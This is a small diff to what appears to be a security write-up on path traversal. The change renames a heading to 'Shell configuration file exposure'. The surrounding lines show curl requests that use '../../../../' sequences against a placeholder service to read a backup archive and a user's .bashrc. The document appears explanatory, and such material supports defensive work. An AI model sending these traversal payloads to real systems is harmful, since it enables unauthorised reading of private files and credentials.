@@ -45,7 +45,7 @@
     curl https://[VULNERABLE-SERVICE]/read?filename=../../../../backup/backup.zip
     ```
 
-- Environment variable exposure
+- Shell configuration file exposure
     ```bash
     curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.bashrc
     ```
